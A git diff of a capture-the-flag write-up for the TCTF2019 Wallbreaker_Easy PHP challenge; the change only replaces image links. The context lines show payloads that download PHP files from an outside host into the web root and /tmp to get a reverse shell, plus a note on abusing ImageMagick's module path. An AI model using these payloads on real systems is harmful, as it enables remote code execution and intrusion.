@@ -127,7 +127,7 @@ backdoor=file_put_contents("/var/www/html/evil.php", file_get_contents("http://1
 
 then visit `evil.php` to get the reverse shell
 
-![](https://i.imgur.com/O7sA9gi.png)
+![img1](./assets/img1.png?raw=true)
 
 ### Other way to exploit
 
@@ -168,13 +168,13 @@ backdoor=file_put_contents("/tmp/46c01c941bd10a9c3038752f7354f2e8/gconv-modules"
 backdoor=file_put_contents("/var/www/html/poc.php", file_get_contents("http://192.168.200.1:8000/poc.php"));
 ```
 
-![](https://i.imgur.com/OL7u7go.png)
+![img2](./assets/img2.png?raw=true)
 
 ### Other way again
 
 In the [original repo](https://github.com/mo-xiaoxi/CTF_Web_docker/tree/master/TCTF2019/Wallbreaker_Easy) of the challenge, the author found an interesting parameter, `MAGICK_CODER_MODULE_PATH`, in the [document](https://www.imagemagick.org/script/resources.php#Environment%20Variables), it can permits the user to arbitrarily extend the image formats supported by ImageMagick by adding loadable coder modules from an preferred location rather than copying them into the ImageMagick installation directory.
 
-![](https://i.imgur.com/yDK1Zzy.png)
+![img3](./assets/img3.png?raw=true)
 
 ### Final
 
